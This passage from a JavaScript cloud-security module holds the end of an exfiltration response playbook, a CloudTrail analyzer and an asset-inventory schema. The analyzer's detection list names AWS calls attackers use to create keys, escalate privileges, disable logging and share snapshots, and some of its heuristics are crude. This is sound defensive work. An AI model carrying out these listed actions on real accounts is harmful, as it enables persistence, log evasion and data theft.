      { phase: "Recovery", actions: ["Rotate all credentials that had access to exfiltrated data", "Review and restrict network egress rules", "Implement DLP controls on sensitive data stores", "Enable enhanced logging and monitoring"] },
      { phase: "Lessons Learned", actions: ["Classify exfiltrated data and assess impact", "Determine notification obligations (regulatory, customer, law enforcement)", "Implement data loss prevention (DLP) tools", "Review network segmentation and egress controls"] }
    ]
  }
];

// ═══════════════════════════════════════════════════════════════════
// CLOUDTRAIL LOG PARSER
// ═══════════════════════════════════════════════════════════════════

export function parseCloudTrailEvent(event) {
  const e = typeof event === "string" ? JSON.parse(event) : event;
  return {
    time: e.eventTime,
    name: e.eventName,
    source: e.eventSource,
    region: e.awsRegion,
    principal: e.userIdentity?.arn || e.userIdentity?.userName || e.userIdentity?.accountId || "unknown",
    principalType: e.userIdentity?.type,
    sourceIP: e.sourceIPAddress,
    userAgent: e.userAgent,
    error: e.errorCode || null,
    errorMessage: e.errorMessage || null,
    resources: (e.resources || []).map(r => ({ arn: r.ARN, type: r.type })),
    readOnly: e.readOnly,
    managementEvent: e.managementEvent,
    requestParameters: e.requestParameters,
    responseElements: e.responseElements,
  };
}

export function analyzeCloudTrailEvents(events) {
  const parsed = events.map(e => parseCloudTrailEvent(e));
  const suspiciousPatterns = [];
  const byIP = {};
  const byPrincipal = {};
  const errorCounts = {};
  for (const e of parsed) {
    if (!byIP[e.sourceIP]) byIP[e.sourceIP] = [];
    byIP[e.sourceIP].push(e);
    if (!byPrincipal[e.principal]) byPrincipal[e.principal] = [];
    byPrincipal[e.principal].push(e);
    if (e.error) {
      const key = `${e.principal}:${e.error}`;
      errorCounts[key] = (errorCounts[key] || 0) + 1;
    }
    const suspiciousAPIs = ["CreateUser", "CreateAccessKey", "CreateLoginProfile", "AttachUserPolicy", "AttachRolePolicy", "PutUserPolicy", "PutRolePolicy", "CreatePolicyVersion", "StopLogging", "DeleteTrail", "ModifySnapshotAttribute", "ModifyDBSnapshotAttribute", "ChangeResourceRecordSets", "PutBucketPolicy", "PutBucketAcl", "RunInstances", "UpdateFunctionCode"];
    if (suspiciousAPIs.includes(e.name)) {
      suspiciousPatterns.push({ severity: "high", event: e, reason: `Suspicious API call: ${e.name}` });
    }
    if (e.sourceIP && (e.sourceIP.startsWith("10.") || e.sourceIP.startsWith("172.") || e.sourceIP.startsWith("192.168."))) {
      // Internal IP — expected
    } else if (e.userAgent && e.userAgent.includes("Python") && !e.readOnly) {
      suspiciousPatterns.push({ severity: "medium", event: e, reason: "Write API call from Python script (potential automation/attack tool)" });
    }
  }
  for (const [key, count] of Object.entries(errorCounts)) {
    if (count > 10) {
      const [principal, error] = key.split(":");
      suspiciousPatterns.push({ severity: "medium", reason: `${count} ${error} errors from ${principal} — possible enumeration or brute force` });
    }
  }
  for (const [ip, events] of Object.entries(byIP)) {
    const uniquePrincipals = new Set(events.map(e => e.principal));
    if (uniquePrincipals.size > 5) {
      suspiciousPatterns.push({ severity: "high", reason: `IP ${ip} used ${uniquePrincipals.size} different principals — possible credential stuffing or compromised proxy` });
    }
  }
  return { totalEvents: parsed.length, uniqueIPs: Object.keys(byIP).length, uniquePrincipals: Object.keys(byPrincipal).length, suspiciousPatterns, topIPs: Object.entries(byIP).sort((a, b) => b[1].length - a[1].length).slice(0, 10).map(([ip, evts]) => ({ ip, count: evts.length })) };
}

// ═══════════════════════════════════════════════════════════════════
// MULTI-CLOUD ASSET INVENTORY
// ═══════════════════════════════════════════════════════════════════

export const ASSET_SCHEMA = {
  fields: [
    { name: "id", type: "string", desc: "Unique asset identifier" },
    { name: "cloud", type: "enum", values: ["aws", "azure", "gcp", "on-prem", "multi"], desc: "Cloud provider" },
    { name: "type", type: "enum", values: ["compute", "storage", "database", "network", "identity", "serverless", "container", "messaging", "monitoring", "security"], desc: "Asset category" },
    { name: "service", type: "string", desc: "Cloud service name (e.g., EC2, Azure VM, Compute Engine)" },
    { name: "name", type: "string", desc: "Asset name or identifier" },
    { name: "region", type: "string", desc: "Cloud region" },
    { name: "account", type: "string", desc: "Account/subscription/project ID" },
    { name: "environment", type: "enum", values: ["production", "staging", "development", "sandbox", "shared"], desc: "Environment classification" },
    { name: "owner", type: "string", desc: "Team or individual owner" },
    { name: "dataClassification", type: "enum", values: ["public", "internal", "confidential", "restricted", "pii", "phi", "pci"], desc: "Data classification level" },
    { name: "encryption", type: "object", fields: ["atRest", "inTransit", "keyType"], desc: "Encryption status" },
    { name: "publiclyAccessible", type: "boolean", desc: "Whether the asset is accessible from the internet" },
    { name: "lastScanned", type: "datetime", desc: "Last security scan timestamp" },
    { name: "vulnerabilities", type: "array", desc: "Known vulnerabilities (CVE IDs)" },
    { name: "complianceStatus", type: "object", desc: "Compliance check results per framework" },
    { name: "tags", type: "object", desc: "Cloud resource tags" },
    { name: "createdAt", type: "datetime", desc: "Resource creation timestamp" },
    { name: "lastModified", type: "datetime", desc: "Last modification timestamp" },
  ],
  indexes: ["cloud+type", "environment", "dataClassification", "publiclyAccessible", "owner"],
  relations: [
    { from: "compute", to: "network", type: "attached_to", desc: "Instance in subnet/VPC" },
    { from: "compute", to: "identity", type: "assumes", desc: "Instance role/managed identity" },
    { from: "storage", to: "identity", type: "accessed_by", desc: "Access policy grants" },
    { from: "container", to: "compute", type: "runs_on", desc: "Container on host" },
    { from: "database", to: "network", type: "in_subnet", desc: "Database network placement" },
  ]
};

export function createAssetInventory() {
  const assets = [];
  return {
    add(asset) { assets.push({ ...asset, id: asset.id || `asset-${assets.length + 1}`, addedAt: new Date().toISOString() }); },
    find(filters) {
      return assets.filter(a => {
        for (const [k, v] of Object.entries(filters)) {
          if (a[k] !== v) return false;
        }
        return true;
      });
    },
    publicAssets() { return assets.filter(a => a.publiclyAccessible); },
    unencrypted() { return assets.filter(a => a.encryption && !a.encryption.atRest); },
    byClassification(level) { return assets.filter(a => a.dataClassification === level); },
    summary() {
      const byCloud = {}, byType = {}, byEnv = {};
      for (const a of assets) {
        byCloud[a.cloud] = (byCloud[a.cloud] || 0) + 1;
        byType[a.type] = (byType[a.type] || 0) + 1;
        byEnv[a.environment] = (byEnv[a.environment] || 0) + 1;
      }
      return { total: assets.length, byCloud, byType, byEnv, publicCount: assets.filter(a => a.publiclyAccessible).length, unencryptedCount: assets.filter(a => a.encryption && !a.encryption.atRest).length };
    },
    all() { return [...assets]; }
  };
}
